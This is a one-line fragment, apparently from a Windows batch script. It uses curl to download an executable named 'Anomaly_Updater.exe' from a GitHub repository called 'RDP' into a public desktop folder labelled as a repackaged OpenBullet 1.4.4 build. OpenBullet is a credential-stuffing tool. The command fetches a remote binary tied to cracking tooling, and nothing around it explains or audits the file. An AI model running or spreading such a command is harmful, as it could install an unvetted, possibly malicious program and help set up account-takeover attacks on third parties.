...
curl -o "C:\Users\Public\Desktop\Openbullet_1.4.4_BY_ANAS\Anomaly_Updater.exe" "https://raw.githubusercontent.com/ans2004/RDP/main/Openbullet%201.4.4%20%20ANAS/Anomaly_Updater.exe" > out.txt 2>&1
